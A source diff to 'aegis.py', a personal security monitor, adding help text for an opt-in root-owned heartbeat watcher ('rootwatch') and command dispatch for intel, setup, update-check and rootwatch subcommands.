@@ -14773,6 +16823,13 @@ HELP = """aegis.py - personal security monitor for macOS, Linux and Windows
   bastion          macOS only, OPT-IN, needs sudo: surface Apple's XProtect
                    Behavioral (Bastion) violations Apple records but never
                    alerts on
+  rootwatch [install|status|uninstall]
+                   OPT-IN root witness (macOS/Linux; not built for Windows
+                   yet): a <60-line root-owned script on a ROOT schedule that
+                   alerts within minutes when the heartbeat dies — the one
+                   watcher a same-uid attacker cannot kill along with Aegis.
+                   Never self-elevates: run without root it changes nothing
+                   and prints the sudo line for YOU. `status` needs no root
 
  RESPOND (opt-in; you run these by hand on a reviewed finding — never automatic)
   quarantine <path>      atomically confine a file or valid .app bundle
@@ -14931,6 +16988,8 @@ def main(argv):
         return cmd_allow(argv[2])
     if cmd == "vt" and len(argv) > 2:
         return cmd_vt(argv[2])
+    if cmd == "intel":
+        return cmd_intel(argv[2] if len(argv) > 2 else "status")
     if cmd == "canary":
         return cmd_canary(argv[2] if len(argv) > 2 else "plant")
     if cmd == "watch":
@@ -14948,10 +17007,16 @@ def main(argv):
         return cmd_install(mode, secs)
     if cmd == "uninstall":
         return cmd_uninstall()
+    if cmd == "setup":
+        return cmd_setup()
+    if cmd == "update-check":
+        return cmd_update_check(remote=("--remote" in argv[2:]))
     if cmd == "watchdog":
         return cmd_watchdog()
     if cmd == "bastion":
         return cmd_bastion()
+    if cmd == "rootwatch":
+        return cmd_rootwatch(argv[2] if len(argv) > 2 else "status")
     # --- response tier (opt-in) ---
     if cmd == "quarantine" and len(argv) > 2:
         return cmd_quarantine(argv[2])
